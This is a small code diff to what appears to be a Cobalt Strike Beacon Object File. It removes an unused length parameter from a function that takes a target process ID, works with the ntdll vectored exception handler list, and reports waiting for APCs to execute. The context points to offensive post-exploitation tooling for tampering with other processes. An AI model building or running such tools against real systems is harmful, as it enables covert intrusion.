@@ -26,7 +26,7 @@ void GetShit(PVOID* pReturn, PVOID* pLdrpVectorHandlerList) {
 	*pReturn = (PVOID)ret;
 }
 
-BOOL FixShit(ULONG pid, ULONG len) {
+BOOL FixShit(ULONG pid) {
 
     ULONG   ret,
             old;
@@ -151,12 +151,11 @@ _End:
 void go(char* args, int argc) {
 
     datap parser;
-    int len;
 
     BeaconDataParse(&parser, args, argc);
     ULONG pid = BeaconDataInt(&parser);
 
-    if (FixShit(pid, len)) {
+    if (FixShit(pid)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[i] Done, maybe wait a bit for APCs to exec");
     }
 }
